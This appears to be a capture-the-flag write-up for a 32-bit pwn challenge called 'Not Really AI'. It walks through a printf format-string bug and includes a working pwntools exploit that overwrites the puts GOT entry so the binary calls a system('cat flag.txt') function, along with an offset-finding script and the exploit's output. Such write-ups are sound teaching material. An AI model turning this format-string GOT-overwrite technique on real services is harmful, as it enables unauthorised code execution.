# Really Awesome CTF 2020

## Not Really AI

> 200
>
> Challenge instance ready at `88.198.219.20:17119`
>
> Exploit the service to get the flag.
>
> Author: Ironstone
>
> [`nra`](nra)

Tags: _pwn_ _x86_ _got_ _format-string_

## Summary

Format-string vulnerability -> control execution with a simple GOT exploit.


## Analysis

### Checksec

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

No mitigations in place.


### Decompile with Ghidra

Two functions of interest, `response` and `flaggy`:

```c
void response(void)

{
  char local_20c [516];
  
  puts("How are you finding RACTF?");
  fgets(local_20c,0x200,stdin);
  puts("I am glad you");
  printf(local_20c);
  puts("\nWe hope you keep going!");
  return;
}
```

With no mitigations in place, various `printf` format-string exploits are possible, the simplest is to replace the `puts` GOT entry with `flaggy`, then instead of `puts("\nWe hope you keep going!");`, you get:

```c
void flaggy(void)

{
  int iVar1;
  
  iVar1 = __x86.get_pc_thunk.ax();
  system((char *)(iVar1 + 0xdf9));
  return;
}
```

`flaggy` calls `system` with an parameter of `iVar1 + 0xdf9`.  To figure out what that actually is, take the address after `iVar1 = __x86.get_pc_thunk.ax();` and add `0xdf9` to it:

```
        0804924c e8 9a 00 00 00        CALL       __x86.get_pc_thunk.ax
        08049251 05 af 2d 00 00        ADD        EAX,0x2daf
```

`0x8049251` + `0xdf9` = `0x804a04a`.  Then look at that address in the disassembly:

```
        0804a04a 63 61 74        ds         "cat flag.txt"
                 20 66 6c 
                 61 67 2e 
```

So, `system("cat flag.txt")`.


## Exploit

```
#!/usr/bin/python3

from pwn import *

#p = process('./nra')
p = remote('88.198.219.20',61933)
binary = ELF('./nra')

p.recvuntil('How are you finding RACTF?')
p.sendline(fmtstr_payload(4,{binary.got['puts']:binary.symbols['flaggy']}))
p.recvline()
p.recvline()
p.recvline()
_ = p.recvline().decode().strip()
print(_)
```

Using the pwntools fmtstr functions, update the GOT `puts` entry with the address of `flaggy`.

The first parameter to `fmtstr_payload` is the offset; you can find this with GDB or with a simple script like this:

```
#!/usr/bin/python3

from pwn import *

def scanit(t):
	p = process('./nra')
	#p = remote('pwn.hsctf.com', 5004)
	p.recvuntil('How are you finding RACTF?')
	p.sendline(t)
	p.recvuntil('I am glad you\n')
	_ = p.recvline().strip()
	p.close()
	return _

for i in range(1,20):
	t = '%' + str(i).rjust(2,'0') + '$010p'
	_ = scanit(t)
	print(i,_)
	if _.find(b'0x') >= 0:
		s = bytes.fromhex(_[2:].decode())[::-1]
		if s == t[:4].encode():
			print('offset:',i)
			break

# ./offset.py | grep -v ]
1 b'0x00000200'
2 b'0xf7f5a580'
3 b'0x080491d1'
4 b'0x24343025'
offset: 4
```

> You could probably just combine the two scripts to fully automate this.

Exploit output:

```
# ./exploit.py
[+] Opening connection to 88.198.219.20 on port 61933: Done
[*] '/pwd/datajerk/ractf2020/nra/nra'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
ractf{f0rmat_Str1nG_fuN}
```

